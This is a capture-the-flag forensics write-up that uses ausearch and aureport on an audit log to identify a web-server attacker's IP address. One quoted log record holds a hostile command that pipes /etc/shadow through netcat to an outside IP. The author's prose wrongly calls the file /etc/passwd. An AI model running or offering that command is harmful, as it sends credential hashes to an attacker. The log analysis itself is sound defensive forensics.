
# I SEe You - Points: 200

## Challenge
* Category: Miscellaneous
* Points: 200

We think someone has been attacking our web server, can you help us by finding the IP address of the attacker in our logs? audit.log.gz


### Hints
* The flag is the IP address of the attacker without any prefixes or braces around it.
* Audit logs can be read via the ausearch command.

## Solution
### Tools
* [ausearch and aureport](https://zoomadmin.com/HowToInstall/UbuntuPackage/auditd)


There are some good writeups on using `ausearch` and `aureport` to monitor user activity.


My approach was to run each of the `aureport` commands to find an interesting place to get started.


```
$ sudo aureport --help
usage: aureport [options]
	-a,--avc			Avc report
	-au,--auth			Authentication report
	--comm				Commands run report
	-c,--config			Config change report
	-cr,--crypto			Crypto report
	-e,--event			Event report
	-f,--file			File name report
	--failed			only failed events in report
	-h,--host			Remote Host name report
	--help				help
	-i,--interpret			Interpretive mode
	-if,--input <Input File name>	use this file as input
	--input-logs			Use the logs even if stdin is a pipe
	--integrity			Integrity event report
	-l,--login			Login report
	-k,--key			Key report
	-m,--mods			Modification to accounts report
	-ma,--mac			Mandatory Access Control (MAC) report
	-n,--anomaly			aNomaly report
	-nc,--no-config			Don't include config events
	--node <node name>		Only events from a specific node
	-p,--pid			Pid report
	-r,--response			Response to anomaly report
	-s,--syscall			Syscall report
	--success			only success events in report
	--summary			sorted totals for main object in report
	-t,--log			Log time range report
	-te,--end [end date] [end time]	ending date & time for reports
	-tm,--terminal			TerMinal name report
	-ts,--start [start date] [start time]	starting data & time for reports
	--tty				Report about tty keystrokes
	-u,--user			User name report
	-v,--version			Version
	--virt				Virtualization report
	-x,--executable			eXecutable name report
	If no report is given, the summary report will be displayed

```

So I ran through each of the reporting options until I found `getcwd` in the syscall summary report. This is interesting because its almost always one of the first commands an adversary runs once they have access to a host.

```
$ aureport -if audit.log -s --summary
```

From there I pivoted to viewing syscall events with `getcwd`

```
$ ausearch -if audit.log -sc getcwd -i
----
type=PROCTITLE msg=audit(11/19/19 11:30:53.909:1134) : proctitle=autrace /bin/python3 server.py
type=SYSCALL msg=audit(11/19/19 11:30:53.909:1134) : arch=x86_64 syscall=getcwd success=yes exit=17 a0=0x7ffeac0ae740 a1=0x1000 a2=0x1000 a3=0x7ffeac0ae1a0 items=0 ppid=2626 pid=2628 auid=vagrant uid=root gid=root euid=root suid=root fsuid=root egid=root sgid=root fsgid=root tty=(none) ses=2 comm=python3 exe=/usr/bin/python3.6 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key=(null)
----
type=PROCTITLE msg=audit(11/19/19 11:30:53.995:2549) : proctitle=autrace /bin/python3 server.py
type=SYSCALL msg=audit(11/19/19 11:30:53.995:2549) : arch=x86_64 syscall=getcwd success=yes exit=17 a0=0xc5dd60 a1=0x400 a2=0xc5dd60 a3=0x7ffeac0b2a60 items=0 ppid=2626 pid=2628 auid=vagrant uid=root gid=root euid=root suid=root fsuid=root egid=root sgid=root fsgid=root tty=(none) ses=2 comm=python3 exe=/usr/bin/python3.6 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key=(null)
----
type=PROCTITLE msg=audit(11/19/19 11:30:54.165:4469) : proctitle=autrace /bin/python3 server.py
type=SYSCALL msg=audit(11/19/19 11:30:54.165:4469) : arch=x86_64 syscall=getcwd success=yes exit=17 a0=0xe4b150 a1=0x400 a2=0xe4b150 a3=0x40 items=0 ppid=2626 pid=2628 auid=vagrant uid=root gid=root euid=root suid=root fsuid=root egid=root sgid=root fsgid=root tty=(none) ses=2 comm=python3 exe=/usr/bin/python3.6 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key=(null)
----
type=PROCTITLE msg=audit(11/19/19 11:30:54.165:4470) : proctitle=autrace /bin/python3 server.py
type=SYSCALL msg=audit(11/19/19 11:30:54.165:4470) : arch=x86_64 syscall=getcwd success=yes exit=17 a0=0xe4b150 a1=0x400 a2=0xe4b150 a3=0x40 items=0 ppid=2626 pid=2628 auid=vagrant uid=root gid=root euid=root suid=root fsuid=root egid=root sgid=root fsgid=root tty=(none) ses=2 comm=python3 exe=/usr/bin/python3.6 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key=(null)
----
type=PROCTITLE msg=audit(11/19/19 11:31:30.007:46406) : proctitle=/bin/python3 server.py
type=SYSCALL msg=audit(11/19/19 11:31:30.007:46406) : arch=x86_64 syscall=getcwd success=yes exit=17 a0=0xd4e740 a1=0x1000 a2=0xd4e740 a3=0x63 items=0 ppid=2628 pid=5403 auid=vagrant uid=root gid=root euid=root suid=root fsuid=root egid=root sgid=root fsgid=root tty=(none) ses=2 comm=sh exe=/usr/bin/bash subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key=(null)
```

\*singing\* "One of these is not like the others"

So. One of the events is different from the others. Lets examine `pid 5403`

```
$ ausearch -if audit.log -p 5403 -i
...
type=PROCTITLE msg=audit(11/19/19 11:31:30.007:46336) : proctitle=/bin/python3 server.py
type=PATH msg=audit(11/19/19 11:31:30.007:46336) : item=1 name=/lib64/ld-linux-x86-64.so.2 inode=6204 dev=08:01 mode=file,755 ouid=root ogid=root rdev=00:00 obj=system_u:object_r:ld_so_t:s0 objtype=NORMAL cap_fp=none cap_fi=none cap_fe=0 cap_fver=0
type=PATH msg=audit(11/19/19 11:31:30.007:46336) : item=0 name=/bin/sh inode=100737155 dev=08:01 mode=file,755 ouid=root ogid=root rdev=00:00 obj=system_u:object_r:shell_exec_t:s0 objtype=NORMAL cap_fp=none cap_fi=none cap_fe=0 cap_fver=0
type=CWD msg=audit(11/19/19 11:31:30.007:46336) :  cwd=/vagrant/website
type=EXECVE msg=audit(11/19/19 11:31:30.007:46336) : argc=3 a0=/bin/sh a1=-c a2=cat /etc/shadow|nc 44.68.139.241 3333
type=SYSCALL msg=audit(11/19/19 11:31:30.007:46336) : arch=x86_64 syscall=execve success=yes exit=0 a0=0x7f44c0c15870 a1=0x7f44c0b20930 a2=0x7ffeac0bfa60 a3=0x7f44cee4a770 items=2 ppid=2628 pid=5403 auid=vagrant uid=root gid=root euid=root suid=root fsuid=root egid=root sgid=root fsgid=root tty=(none) ses=2 comm=sh exe=/usr/bin/bash subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key=(null)

```
Awesome. Hey someone cat the `/etc/passwd` file and netcat the contents to the external IP 44.68.139.241. That is definitely malicious.

FLAG = **44.68.139.241**
